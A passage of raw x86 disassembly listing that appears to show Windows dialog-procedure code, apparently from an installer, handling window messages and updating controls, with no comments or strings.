  40525d:	8d 44 24 64          	lea    0x64(%esp),%eax
  405261:	33 f6                	xor    %esi,%esi
  405263:	50                   	push   %eax
  405264:	56                   	push   %esi
  405265:	68 ec 03 00 00       	push   $0x3ec
  40526a:	ff 74 24 6c          	push   0x6c(%esp)
  40526e:	ff 15 50 92 40 00    	call   *0x409250
  405274:	50                   	push   %eax
  405275:	68 f6 5d 40 00       	push   $0x405df6
  40527a:	56                   	push   %esi
  40527b:	56                   	push   %esi
  40527c:	ff 15 9c 90 40 00    	call   *0x40909c
  405282:	50                   	push   %eax
  405283:	ff 15 10 91 40 00    	call   *0x409110
  405289:	ff 74 24 6c          	push   0x6c(%esp)
  40528d:	ff 74 24 6c          	push   0x6c(%esp)
  405291:	57                   	push   %edi
  405292:	e8 40 0a 00 00       	call   0x405cd7
  405297:	5f                   	pop    %edi
  405298:	5e                   	pop    %esi
  405299:	5d                   	pop    %ebp
  40529a:	5b                   	pop    %ebx
  40529b:	83 c4 4c             	add    $0x4c,%esp
  40529e:	c2 10 00             	ret    $0x10
  4052a1:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  4052a7:	75 29                	jne    0x4052d2
  4052a9:	b8 03 04 00 00       	mov    $0x403,%eax
  4052ae:	66 39 44 24 68       	cmp    %ax,0x68(%esp)
  4052b3:	75 d4                	jne    0x405289
  4052b5:	8b 35 54 92 40 00    	mov    0x409254,%esi
  4052bb:	6a 00                	push   $0x0
  4052bd:	ff 35 04 62 47 00    	push   0x476204
  4052c3:	ff d6                	call   *%esi
  4052c5:	6a 08                	push   $0x8
  4052c7:	53                   	push   %ebx
  4052c8:	ff d6                	call   *%esi
  4052ca:	53                   	push   %ebx
  4052cb:	e8 af 07 00 00       	call   0x405a7f
  4052d0:	eb b7                	jmp    0x405289
  4052d2:	81 ff 04 04 00 00    	cmp    $0x404,%edi
  4052d8:	75 46                	jne    0x405320
  4052da:	83 3d 0c 62 47 00 00 	cmpl   $0x0,0x47620c
  4052e1:	74 13                	je     0x4052f6
  4052e3:	c7 05 44 1d 44 00 02 	movl   $0x2,0x441d44
  4052ea:	00 00 00 
  4052ed:	6a 78                	push   $0x78
  4052ef:	e8 10 0c 00 00       	call   0x405f04
  4052f4:	eb 93                	jmp    0x405289
  4052f6:	6a 08                	push   $0x8
  4052f8:	ff 35 18 62 47 00    	push   0x476218
  4052fe:	ff 15 54 92 40 00    	call   *0x409254
  405304:	83 3d ec e2 47 00 00 	cmpl   $0x0,0x47e2ec
  40530b:	75 0f                	jne    0x40531c
  40530d:	a1 4c 1d 45 00       	mov    0x451d4c,%eax
  405312:	6a 00                	push   $0x0
  405314:	ff 70 34             	push   0x34(%eax)
  405317:	e8 f5 0f 00 00       	call   0x406311
  40531c:	6a 01                	push   $0x1
  40531e:	eb cf                	jmp    0x4052ef
  405320:	83 ff 7b             	cmp    $0x7b,%edi
  405323:	0f 85 60 ff ff ff    	jne    0x405289
  405329:	39 5c 24 68          	cmp    %ebx,0x68(%esp)
  40532d:	0f 85 56 ff ff ff    	jne    0x405289
  405333:	33 f6                	xor    %esi,%esi
  405335:	56                   	push   %esi
  405336:	56                   	push   %esi
  405337:	68 04 10 00 00       	push   $0x1004
  40533c:	53                   	push   %ebx
  40533d:	ff 15 64 92 40 00    	call   *0x409264
  405343:	8b e8                	mov    %eax,%ebp
  405345:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  405349:	85 ed                	test   %ebp,%ebp
  40534b:	0f 8e 10 01 00 00    	jle    0x405461
  405351:	ff 15 c8 91 40 00    	call   *0x4091c8
  405357:	6a e1                	push   $0xffffffe1
  405359:	56                   	push   %esi
  40535a:	89 44 24 70          	mov    %eax,0x70(%esp)
  40535e:	e8 2e 11 00 00       	call   0x406491
  405363:	50                   	push   %eax
  405364:	33 ff                	xor    %edi,%edi
  405366:	47                   	inc    %edi
  405367:	57                   	push   %edi
  405368:	56                   	push   %esi
  405369:	ff 74 24 74          	push   0x74(%esp)
  40536d:	ff 15 c0 91 40 00    	call   *0x4091c0
  405373:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  405377:	8b c1                	mov    %ecx,%eax
  405379:	c1 e8 10             	shr    $0x10,%eax
  40537c:	0f bf d1             	movswl %cx,%edx
  40537f:	98                   	cwtl
  405380:	83 f9 ff             	cmp    $0xffffffff,%ecx
  405383:	75 14                	jne    0x405399
  405385:	8d 44 24 10          	lea    0x10(%esp),%eax
  405389:	50                   	push   %eax
  40538a:	53                   	push   %ebx
  40538b:	ff 15 b8 91 40 00    	call   *0x4091b8
  405391:	8b 54 24 10          	mov    0x10(%esp),%edx
  405395:	8b 44 24 14          	mov    0x14(%esp),%eax
  405399:	56                   	push   %esi
  40539a:	ff 74 24 64          	push   0x64(%esp)
  40539e:	56                   	push   %esi
  40539f:	50                   	push   %eax
  4053a0:	52                   	push   %edx
  4053a1:	68 80 01 00 00       	push   $0x180
  4053a6:	ff b4 24 80 00 00 00 	push   0x80(%esp)
  4053ad:	ff 15 bc 91 40 00    	call   *0x4091bc
  4053b3:	3b c7                	cmp    %edi,%eax
  4053b5:	0f 85 a6 00 00 00    	jne    0x405461
  4053bb:	89 74 24 28          	mov    %esi,0x28(%esp)
  4053bf:	c7 44 24 34 48 1d 44 	movl   $0x441d48,0x34(%esp)
  4053c6:	00 
  4053c7:	c7 44 24 38 00 80 00 	movl   $0x8000,0x38(%esp)
  4053ce:	00 
  4053cf:	8d 44 24 20          	lea    0x20(%esp),%eax
  4053d3:	4d                   	dec    %ebp
  4053d4:	50                   	push   %eax
  4053d5:	55                   	push   %ebp
  4053d6:	68 73 10 00 00       	push   $0x1073
  4053db:	53                   	push   %ebx
  4053dc:	ff 15 64 92 40 00    	call   *0x409264
  4053e2:	83 c7 02             	add    $0x2,%edi
  4053e5:	03 f8                	add    %eax,%edi
  4053e7:	85 ed                	test   %ebp,%ebp
  4053e9:	75 e4                	jne    0x4053cf
  4053eb:	56                   	push   %esi
  4053ec:	ff 15 e8 91 40 00    	call   *0x4091e8
  4053f2:	ff 15 dc 91 40 00    	call   *0x4091dc
  4053f8:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  4053fb:	50                   	push   %eax
  4053fc:	6a 42                	push   $0x42
  4053fe:	ff 15 f8 90 40 00    	call   *0x4090f8
  405404:	8b e8                	mov    %eax,%ebp
  405406:	55                   	push   %ebp
  405407:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  40540b:	ff 15 94 90 40 00    	call   *0x409094
  405411:	8b 6c 24 64          	mov    0x64(%esp),%ebp
  405415:	8b f8                	mov    %eax,%edi
  405417:	8d 44 24 20          	lea    0x20(%esp),%eax
  40541b:	89 7c 24 34          	mov    %edi,0x34(%esp)
  40541f:	50                   	push   %eax
  405420:	56                   	push   %esi
  405421:	68 73 10 00 00       	push   $0x1073
  405426:	53                   	push   %ebx
  405427:	ff 15 64 92 40 00    	call   *0x409264
  40542d:	6a 0d                	push   $0xd
  40542f:	8d 3c 47             	lea    (%edi,%eax,2),%edi
  405432:	58                   	pop    %eax
  405433:	66 89 07             	mov    %ax,(%edi)
  405436:	6a 0a                	push   $0xa
  405438:	58                   	pop    %eax
  405439:	66 89 47 02          	mov    %ax,0x2(%edi)
  40543d:	83 c7 04             	add    $0x4,%edi
  405440:	46                   	inc    %esi
  405441:	3b f5                	cmp    %ebp,%esi
  405443:	7c d2                	jl     0x405417
  405445:	8b 6c 24 60          	mov    0x60(%esp),%ebp
  405449:	55                   	push   %ebp
  40544a:	ff 15 98 90 40 00    	call   *0x409098
  405450:	55                   	push   %ebp
  405451:	6a 0d                	push   $0xd
  405453:	58                   	pop    %eax
  405454:	50                   	push   %eax
  405455:	ff 15 e0 91 40 00    	call   *0x4091e0
  40545b:	ff 15 e4 91 40 00    	call   *0x4091e4
  405461:	33 c0                	xor    %eax,%eax
  405463:	e9 2f fe ff ff       	jmp    0x405297
  405468:	55                   	push   %ebp
  405469:	8b ec                	mov    %esp,%ebp
  40546b:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  405472:	56                   	push   %esi
  405473:	8b 75 14             	mov    0x14(%ebp),%esi
  405476:	75 26                	jne    0x40549e
  405478:	ff 76 30             	push   0x30(%esi)
  40547b:	6a 1d                	push   $0x1d
  40547d:	ff 75 08             	push   0x8(%ebp)
  405480:	e8 11 06 00 00       	call   0x405a96
  405485:	8b 46 3c             	mov    0x3c(%esi),%eax
  405488:	c1 e0 0e             	shl    $0xe,%eax
  40548b:	05 00 f0 47 00       	add    $0x47f000,%eax
  405490:	50                   	push   %eax
  405491:	68 e8 03 00 00       	push   $0x3e8
  405496:	ff 75 08             	push   0x8(%ebp)
  405499:	e8 06 1f 00 00       	call   0x4073a4
  40549e:	56                   	push   %esi
  40549f:	ff 75 10             	push   0x10(%ebp)
  4054a2:	ff 75 0c             	push   0xc(%ebp)
  4054a5:	e8 2d 08 00 00       	call   0x405cd7
  4054aa:	5e                   	pop    %esi
  4054ab:	5d                   	pop    %ebp
  4054ac:	c2 10 00             	ret    $0x10
  4054af:	55                   	push   %ebp
  4054b0:	8b ec                	mov    %esp,%ebp
  4054b2:	56                   	push   %esi
  4054b3:	33 f6                	xor    %esi,%esi
  4054b5:	46                   	inc    %esi
  4054b6:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4054b9:	75 18                	jne    0x4054d3
  4054bb:	ff 75 14             	push   0x14(%ebp)
  4054be:	68 fb 03 00 00       	push   $0x3fb
  4054c3:	e8 08 1e 00 00       	call   0x4072d0
  4054c8:	ff 75 14             	push   0x14(%ebp)
  4054cb:	56                   	push   %esi
  4054cc:	68 67 04 00 00       	push   $0x467
  4054d1:	eb 2b                	jmp    0x4054fe
  4054d3:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  4054d7:	75 2e                	jne    0x405507
  4054d9:	ff 75 14             	push   0x14(%ebp)
  4054dc:	ff 75 10             	push   0x10(%ebp)
  4054df:	ff 15 80 91 40 00    	call   *0x409180
  4054e5:	85 c0                	test   %eax,%eax
  4054e7:	74 0b                	je     0x4054f4
  4054e9:	6a 07                	push   $0x7
  4054eb:	e8 4c c0 ff ff       	call   0x40153c
  4054f0:	85 c0                	test   %eax,%eax
  4054f2:	74 02                	je     0x4054f6
  4054f4:	33 f6                	xor    %esi,%esi
  4054f6:	56                   	push   %esi
  4054f7:	6a 00                	push   $0x0
  4054f9:	68 65 04 00 00       	push   $0x465
  4054fe:	ff 75 08             	push   0x8(%ebp)
  405501:	ff 15 64 92 40 00    	call   *0x409264
  405507:	33 c0                	xor    %eax,%eax
  405509:	5e                   	pop    %esi
  40550a:	5d                   	pop    %ebp
  40550b:	c2 10 00             	ret    $0x10
  40550e:	83 ec 10             	sub    $0x10,%esp
  405511:	b8 10 01 00 00       	mov    $0x110,%eax
  405516:	53                   	push   %ebx
  405517:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40551b:	55                   	push   %ebp
  40551c:	56                   	push   %esi
  40551d:	33 ed                	xor    %ebp,%ebp
  40551f:	57                   	push   %edi
  405520:	8b 7c 24 28          	mov    0x28(%esp),%edi
  405524:	45                   	inc    %ebp
  405525:	3b f8                	cmp    %eax,%edi
  405527:	0f 84 82 01 00 00    	je     0x4056af
  40552d:	81 ff 08 04 00 00    	cmp    $0x408,%edi
  405533:	0f 84 76 01 00 00    	je     0x4056af
  405539:	83 ff 47             	cmp    $0x47,%edi
  40553c:	75 1a                	jne    0x405558
  40553e:	6a 13                	push   $0x13
  405540:	33 f6                	xor    %esi,%esi
  405542:	56                   	push   %esi
  405543:	56                   	push   %esi
  405544:	56                   	push   %esi
  405545:	56                   	push   %esi
  405546:	53                   	push   %ebx
  405547:	ff 35 50 1d 45 00    	push   0x451d50
  40554d:	ff 15 00 92 40 00    	call   *0x409200
  405553:	e9 43 01 00 00       	jmp    0x40569b
  405558:	83 ff 05             	cmp    $0x5,%edi
  40555b:	75 4e                	jne    0x4055ab
  40555d:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  405561:	8b 35 54 92 40 00    	mov    0x409254,%esi
  405567:	8d 43 ff             	lea    -0x1(%ebx),%eax
  40556a:	f7 d8                	neg    %eax
  40556c:	1b c0                	sbb    %eax,%eax
  40556e:	23 c7                	and    %edi,%eax
  405570:	50                   	push   %eax
  405571:	ff 35 50 1d 45 00    	push   0x451d50
  405577:	ff d6                	call   *%esi
  405579:	83 fb 02             	cmp    $0x2,%ebx
  40557c:	0f 85 1d 01 00 00    	jne    0x40569f
  405582:	6a f0                	push   $0xfffffff0
  405584:	ff 74 24 28          	push   0x28(%esp)
  405588:	ff 15 a8 91 40 00    	call   *0x4091a8
  40558e:	25 00 00 01 21       	and    $0x21010000,%eax
  405593:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  405598:	0f 85 01 01 00 00    	jne    0x40569f
  40559e:	6a 04                	push   $0x4
  4055a0:	ff 74 24 28          	push   0x28(%esp)
  4055a4:	ff d6                	call   *%esi
  4055a6:	e9 f4 00 00 00       	jmp    0x40569f
  4055ab:	81 ff 0d 04 00 00    	cmp    $0x40d,%edi
  4055b1:	75 1a                	jne    0x4055cd
  4055b3:	ff 35 fc 61 47 00    	push   0x4761fc
  4055b9:	ff 15 2c 92 40 00    	call   *0x40922c
  4055bf:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4055c3:	a3 fc 61 47 00       	mov    %eax,0x4761fc
  4055c8:	e9 3d 04 00 00       	jmp    0x405a0a
  4055cd:	83 ff 11             	cmp    $0x11,%edi
  4055d0:	75 13                	jne    0x4055e5
  4055d2:	33 f6                	xor    %esi,%esi
  4055d4:	56                   	push   %esi
  4055d5:	56                   	push   %esi
  4055d6:	53                   	push   %ebx
  4055d7:	ff 15 38 92 40 00    	call   *0x409238
  4055dd:	33 c0                	xor    %eax,%eax
  4055df:	40                   	inc    %eax
  4055e0:	e9 43 04 00 00       	jmp    0x405a28
  4055e5:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  4055eb:	0f 85 aa 00 00 00    	jne    0x40569b
  4055f1:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4055f5:	0f b7 f3             	movzwl %bx,%esi
  4055f8:	56                   	push   %esi
  4055f9:	ff 74 24 28          	push   0x28(%esp)
  4055fd:	89 74 24 30          	mov    %esi,0x30(%esp)
  405601:	ff 15 50 92 40 00    	call   *0x409250
  405607:	8b e8                	mov    %eax,%ebp
  405609:	85 ed                	test   %ebp,%ebp
  40560b:	74 23                	je     0x405630
  40560d:	33 f6                	xor    %esi,%esi
  40560f:	56                   	push   %esi
  405610:	56                   	push   %esi
  405611:	68 f3 00 00 00       	push   $0xf3
  405616:	55                   	push   %ebp
  405617:	ff 15 64 92 40 00    	call   *0x409264
  40561d:	55                   	push   %ebp
  40561e:	ff 15 d4 91 40 00    	call   *0x4091d4
  405624:	85 c0                	test   %eax,%eax
  405626:	0f 84 fa 03 00 00    	je     0x405a26
  40562c:	8b 74 24 28          	mov    0x28(%esp),%esi
  405630:	33 ed                	xor    %ebp,%ebp
  405632:	45                   	inc    %ebp
  405633:	3b f5                	cmp    %ebp,%esi
  405635:	75 03                	jne    0x40563a
  405637:	55                   	push   %ebp
  405638:	eb 41                	jmp    0x40567b
  40563a:	83 fe 03             	cmp    $0x3,%esi
  40563d:	75 0d                	jne    0x40564c
  40563f:	83 3d 14 c0 40 00 00 	cmpl   $0x0,0x40c014
  405646:	7e 3a                	jle    0x405682
  405648:	6a ff                	push   $0xffffffff
  40564a:	eb 2f                	jmp    0x40567b
  40564c:	83 fe 02             	cmp    $0x2,%esi
  40564f:	75 31                	jne    0x405682
  405651:	83 3d ec e2 47 00 00 	cmpl   $0x0,0x47e2ec
  405658:	74 0e                	je     0x405668
  40565a:	56                   	push   %esi
  40565b:	e8 dc be ff ff       	call   0x40153c
  405660:	89 35 44 1d 44 00    	mov    %esi,0x441d44
  405666:	eb 11                	jmp    0x405679
  405668:	6a 03                	push   $0x3
  40566a:	e8 cd be ff ff       	call   0x40153c
  40566f:	85 c0                	test   %eax,%eax
  405671:	75 2c                	jne    0x40569f
  405673:	89 2d 44 1d 44 00    	mov    %ebp,0x441d44
  405679:	6a 78                	push   $0x78
  40567b:	e8 84 08 00 00       	call   0x405f04
  405680:	eb 1d                	jmp    0x40569f
  405682:	ff 74 24 30          	push   0x30(%esp)
  405686:	ff 74 24 30          	push   0x30(%esp)
  40568a:	68 11 01 00 00       	push   $0x111
  40568f:	ff 35 fc 61 47 00    	push   0x4761fc
  405695:	ff 15 64 92 40 00    	call   *0x409264
  40569b:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  40569f:	ff 74 24 30          	push   0x30(%esp)
  4056a3:	53                   	push   %ebx
  4056a4:	57                   	push   %edi
  4056a5:	e8 2d 06 00 00       	call   0x405cd7
  4056aa:	e9 79 03 00 00       	jmp    0x405a28
  4056af:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4056b3:	8b 35 50 92 40 00    	mov    0x409250,%esi
  4056b9:	89 0d 48 1d 45 00    	mov    %ecx,0x451d48
  4056bf:	3b f8                	cmp    %eax,%edi
  4056c1:	75 46                	jne    0x405709
  4056c3:	55                   	push   %ebp
  4056c4:	53                   	push   %ebx
  4056c5:	89 1d 18 62 47 00    	mov    %ebx,0x476218
  4056cb:	ff d6                	call   *%esi
  4056cd:	6a 02                	push   $0x2
  4056cf:	53                   	push   %ebx
  4056d0:	a3 54 1d 45 00       	mov    %eax,0x451d54
  4056d5:	ff d6                	call   *%esi
  4056d7:	6a ff                	push   $0xffffffff
  4056d9:	6a 1c                	push   $0x1c
  4056db:	53                   	push   %ebx
  4056dc:	a3 58 1d 45 00       	mov    %eax,0x451d58
  4056e1:	e8 b0 03 00 00       	call   0x405a96
  4056e6:	ff 35 f8 61 47 00    	push   0x4761f8
  4056ec:	6a f2                	push   $0xfffffff2
  4056ee:	53                   	push   %ebx
  4056ef:	ff 15 9c 92 40 00    	call   *0x40929c
  4056f5:	6a 04                	push   $0x4
  4056f7:	e8 40 be ff ff       	call   0x40153c
  4056fc:	a3 0c 62 47 00       	mov    %eax,0x47620c
  405701:	8b cd                	mov    %ebp,%ecx
  405703:	89 2d 48 1d 45 00    	mov    %ebp,0x451d48
  405709:	a1 14 c0 40 00       	mov    0x40c014,%eax
  40570e:	33 f6                	xor    %esi,%esi
  405710:	8b f8                	mov    %eax,%edi
  405712:	c1 e7 06             	shl    $0x6,%edi
  405715:	03 3d 40 e2 47 00    	add    0x47e240,%edi
  40571b:	85 c0                	test   %eax,%eax
  40571d:	78 3c                	js     0x40575b
  40571f:	3b cd                	cmp    %ebp,%ecx
  405721:	75 30                	jne    0x405753
  405723:	56                   	push   %esi
  405724:	ff 77 10             	push   0x10(%edi)
  405727:	e8 6d bc ff ff       	call   0x401399
  40572c:	85 c0                	test   %eax,%eax
  40572e:	74 23                	je     0x405753
  405730:	55                   	push   %ebp
  405731:	56                   	push   %esi
  405732:	68 0f 04 00 00       	push   $0x40f
  405737:	ff 35 fc 61 47 00    	push   0x4761fc
  40573d:	ff 15 64 92 40 00    	call   *0x409264
  405743:	33 c0                	xor    %eax,%eax
  405745:	39 05 0c 62 47 00    	cmp    %eax,0x47620c
  40574b:	0f 94 c0             	sete   %al
  40574e:	e9 d5 02 00 00       	jmp    0x405a28
  405753:	39 37                	cmp    %esi,(%edi)
  405755:	0f 84 cb 02 00 00    	je     0x405a26
  40575b:	68 0b 04 00 00       	push   $0x40b
  405760:	e8 ff 02 00 00       	call   0x405a64
  405765:	8b 0d 14 c0 40 00    	mov    0x40c014,%ecx
  40576b:	a1 48 1d 45 00       	mov    0x451d48,%eax
  405770:	03 c8                	add    %eax,%ecx
  405772:	c1 e0 06             	shl    $0x6,%eax
  405775:	03 f8                	add    %eax,%edi
  405777:	89 0d 14 c0 40 00    	mov    %ecx,0x40c014
  40577d:	a1 44 e2 47 00       	mov    0x47e244,%eax
  405782:	3b c8                	cmp    %eax,%ecx
  405784:	75 11                	jne    0x405797
  405786:	55                   	push   %ebp
  405787:	e8 b0 bd ff ff       	call   0x40153c
  40578c:	a1 44 e2 47 00       	mov    0x47e244,%eax
  405791:	8b 0d 14 c0 40 00    	mov    0x40c014,%ecx
  405797:	39 35 0c 62 47 00    	cmp    %esi,0x47620c
  40579d:	0f 85 43 02 00 00    	jne    0x4059e6
  4057a3:	3b c8                	cmp    %eax,%ecx
  4057a5:	0f 83 3b 02 00 00    	jae    0x4059e6
  4057ab:	ff 77 24             	push   0x24(%edi)
  4057ae:	8b 47 14             	mov    0x14(%edi),%eax
  4057b1:	68 00 70 4f 00       	push   $0x4f7000
  4057b6:	89 44 24 34          	mov    %eax,0x34(%esp)
  4057ba:	e8 d2 0c 00 00       	call   0x406491
  4057bf:	ff 77 20             	push   0x20(%edi)
  4057c2:	68 19 fc ff ff       	push   $0xfffffc19
  4057c7:	53                   	push   %ebx
  4057c8:	e8 c9 02 00 00       	call   0x405a96
  4057cd:	ff 77 1c             	push   0x1c(%edi)
  4057d0:	68 1b fc ff ff       	push   $0xfffffc1b
  4057d5:	53                   	push   %ebx
  4057d6:	e8 bb 02 00 00       	call   0x405a96
  4057db:	ff 77 28             	push   0x28(%edi)
  4057de:	68 1a fc ff ff       	push   $0xfffffc1a
  4057e3:	53                   	push   %ebx
  4057e4:	e8 ad 02 00 00       	call   0x405a96
  4057e9:	6a 03                	push   $0x3
  4057eb:	53                   	push   %ebx
  4057ec:	ff 15 50 92 40 00    	call   *0x409250
  4057f2:	8b c8                	mov    %eax,%ecx
  4057f4:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4057f8:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  4057fc:	39 35 ec e2 47 00    	cmp    %esi,0x47e2ec
  405802:	74 0c                	je     0x405810
  405804:	25 fd fe ff ff       	and    $0xfffffefd,%eax
  405809:	83 c8 04             	or     $0x4,%eax
  40580c:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  405810:	83 e0 08             	and    $0x8,%eax
  405813:	50                   	push   %eax
  405814:	51                   	push   %ecx
  405815:	ff 15 54 92 40 00    	call   *0x409254
  40581b:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40581f:	25 00 01 00 00       	and    $0x100,%eax
  405824:	50                   	push   %eax
  405825:	ff 74 24 28          	push   0x28(%esp)
  405829:	ff 15 4c 92 40 00    	call   *0x40924c
  40582f:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405833:	83 e0 02             	and    $0x2,%eax
  405836:	50                   	push   %eax
  405837:	ff 35 54 1d 45 00    	push   0x451d54
  40583d:	ff 15 4c 92 40 00    	call   *0x40924c
  405843:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405847:	83 e0 04             	and    $0x4,%eax
  40584a:	50                   	push   %eax
  40584b:	ff 35 58 1d 45 00    	push   0x451d58
  405851:	89 44 24 34          	mov    %eax,0x34(%esp)
  405855:	ff 15 4c 92 40 00    	call   *0x40924c
  40585b:	39 74 24 2c          	cmp    %esi,0x2c(%esp)
  40585f:	74 03                	je     0x405864
  405861:	56                   	push   %esi
  405862:	eb 01                	jmp    0x405865
  405864:	55                   	push   %ebp
  405865:	68 60 f0 00 00       	push   $0xf060
  40586a:	56                   	push   %esi
  40586b:	53                   	push   %ebx
  40586c:	ff 15 cc 91 40 00    	call   *0x4091cc
  405872:	50                   	push   %eax
  405873:	ff 15 c4 91 40 00    	call   *0x4091c4
  405879:	55                   	push   %ebp
  40587a:	56                   	push   %esi
  40587b:	68 f4 00 00 00       	push   $0xf4
  405880:	ff 74 24 30          	push   0x30(%esp)
  405884:	ff 15 64 92 40 00    	call   *0x409264
  40588a:	39 35 ec e2 47 00    	cmp    %esi,0x47e2ec
  405890:	74 17                	je     0x4058a9
  405892:	56                   	push   %esi
  405893:	6a 02                	push   $0x2
  405895:	68 01 04 00 00       	push   $0x401
  40589a:	53                   	push   %ebx
  40589b:	ff 15 64 92 40 00    	call   *0x409264
  4058a1:	ff 35 58 1d 45 00    	push   0x451d58
  4058a7:	eb 06                	jmp    0x4058af
  4058a9:	ff 35 54 1d 45 00    	push   0x451d54
  4058af:	e8 cb 01 00 00       	call   0x405a7f
  4058b4:	e8 39 0a 00 00       	call   0x4062f2
  4058b9:	50                   	push   %eax
  4058ba:	68 48 1d 44 00       	push   $0x441d48
  4058bf:	e8 ec 1a 00 00       	call   0x4073b0
  4058c4:	ff 77 18             	push   0x18(%edi)
  4058c7:	68 48 1d 44 00       	push   $0x441d48
  4058cc:	e8 f5 1a 00 00       	call   0x4073c6
  4058d1:	8d 04 45 48 1d 44 00 	lea    0x441d48(,%eax,2),%eax
  4058d8:	50                   	push   %eax
  4058d9:	e8 b3 0b 00 00       	call   0x406491
  4058de:	68 48 1d 44 00       	push   $0x441d48
  4058e3:	53                   	push   %ebx
  4058e4:	ff 15 20 92 40 00    	call   *0x409220
  4058ea:	56                   	push   %esi
  4058eb:	ff 77 08             	push   0x8(%edi)
  4058ee:	e8 a6 ba ff ff       	call   0x401399
  4058f3:	85 c0                	test   %eax,%eax
  4058f5:	0f 85 6a fe ff ff    	jne    0x405765
  4058fb:	39 37                	cmp    %esi,(%edi)
  4058fd:	0f 84 62 fe ff ff    	je     0x405765
  405903:	83 7f 04 05          	cmpl   $0x5,0x4(%edi)
  405907:	75 1d                	jne    0x405926
  405909:	39 35 ec e2 47 00    	cmp    %esi,0x47e2ec
  40590f:	0f 85 11 01 00 00    	jne    0x405a26
  405915:	39 35 e0 e2 47 00    	cmp    %esi,0x47e2e0
  40591b:	0f 85 44 fe ff ff    	jne    0x405765
  405921:	e9 00 01 00 00       	jmp    0x405a26
  405926:	ff 35 fc 61 47 00    	push   0x4761fc
  40592c:	ff 15 2c 92 40 00    	call   *0x40922c
  405932:	89 3d 4c 1d 45 00    	mov    %edi,0x451d4c
  405938:	39 37                	cmp    %esi,(%edi)
  40593a:	0f 8e c5 00 00 00    	jle    0x405a05
  405940:	8b 47 04             	mov    0x4(%edi),%eax
  405943:	57                   	push   %edi
  405944:	ff 34 85 18 c0 40 00 	push   0x40c018(,%eax,4)
  40594b:	66 8b 07             	mov    (%edi),%ax
  40594e:	66 03 05 f4 61 47 00 	add    0x4761f4,%ax
  405955:	53                   	push   %ebx
  405956:	0f b7 c0             	movzwl %ax,%eax
  405959:	50                   	push   %eax
  40595a:	ff 35 14 62 47 00    	push   0x476214
  405960:	ff 15 28 92 40 00    	call   *0x409228
  405966:	a3 fc 61 47 00       	mov    %eax,0x4761fc
  40596b:	85 c0                	test   %eax,%eax
  40596d:	0f 84 97 00 00 00    	je     0x405a0a
  405973:	ff 77 2c             	push   0x2c(%edi)
  405976:	6a 06                	push   $0x6
  405978:	50                   	push   %eax
  405979:	e8 18 01 00 00       	call   0x405a96
  40597e:	8d 44 24 10          	lea    0x10(%esp),%eax
  405982:	50                   	push   %eax
  405983:	68 fa 03 00 00       	push   $0x3fa
  405988:	53                   	push   %ebx
  405989:	ff 15 50 92 40 00    	call   *0x409250
  40598f:	50                   	push   %eax
  405990:	ff 15 b8 91 40 00    	call   *0x4091b8
  405996:	8d 44 24 10          	lea    0x10(%esp),%eax
  40599a:	50                   	push   %eax
  40599b:	53                   	push   %ebx
  40599c:	ff 15 b0 91 40 00    	call   *0x4091b0
  4059a2:	6a 15                	push   $0x15
  4059a4:	56                   	push   %esi
  4059a5:	56                   	push   %esi
  4059a6:	ff 74 24 20          	push   0x20(%esp)
  4059aa:	ff 74 24 20          	push   0x20(%esp)
  4059ae:	56                   	push   %esi
  4059af:	ff 35 fc 61 47 00    	push   0x4761fc
  4059b5:	ff 15 00 92 40 00    	call   *0x409200
  4059bb:	56                   	push   %esi
  4059bc:	ff 77 0c             	push   0xc(%edi)
  4059bf:	e8 d5 b9 ff ff       	call   0x401399
  4059c4:	39 35 0c 62 47 00    	cmp    %esi,0x47620c
  4059ca:	75 5a                	jne    0x405a26
  4059cc:	6a 08                	push   $0x8
  4059ce:	ff 35 fc 61 47 00    	push   0x4761fc
  4059d4:	ff 15 54 92 40 00    	call   *0x409254
  4059da:	68 05 04 00 00       	push   $0x405
  4059df:	e8 80 00 00 00       	call   0x405a64
  4059e4:	eb 1f                	jmp    0x405a05
  4059e6:	ff 35 fc 61 47 00    	push   0x4761fc
  4059ec:	ff 15 2c 92 40 00    	call   *0x40922c
  4059f2:	ff 35 44 1d 44 00    	push   0x441d44
  4059f8:	89 35 18 62 47 00    	mov    %esi,0x476218
  4059fe:	53                   	push   %ebx
  4059ff:	ff 15 f4 91 40 00    	call   *0x4091f4
  405a05:	a1 fc 61 47 00       	mov    0x4761fc,%eax
  405a0a:	83 3d 40 1d 44 00 00 	cmpl   $0x0,0x441d40
  405a11:	75 13                	jne    0x405a26
  405a13:	85 c0                	test   %eax,%eax
  405a15:	74 0f                	je     0x405a26
  405a17:	6a 0a                	push   $0xa
  405a19:	53                   	push   %ebx
  405a1a:	ff 15 54 92 40 00    	call   *0x409254
  405a20:	89 2d 40 1d 44 00    	mov    %ebp,0x441d40
  405a26:	33 c0                	xor    %eax,%eax
  405a28:	5f                   	pop    %edi
  405a29:	5e                   	pop    %esi
  405a2a:	5d                   	pop    %ebp
  405a2b:	5b                   	pop    %ebx
  405a2c:	83 c4 10             	add    $0x10,%esp
  405a2f:	c2 10 00             	ret    $0x10
  405a32:	56                   	push   %esi
  405a33:	57                   	push   %edi
  405a34:	bf 00 f0 47 00       	mov    $0x47f000,%edi
  405a39:	be 48 1d 44 00       	mov    $0x441d48,%esi
  405a3e:	57                   	push   %edi
  405a3f:	56                   	push   %esi
  405a40:	e8 6b 19 00 00       	call   0x4073b0
  405a45:	ff 74 24 10          	push   0x10(%esp)
  405a49:	57                   	push   %edi
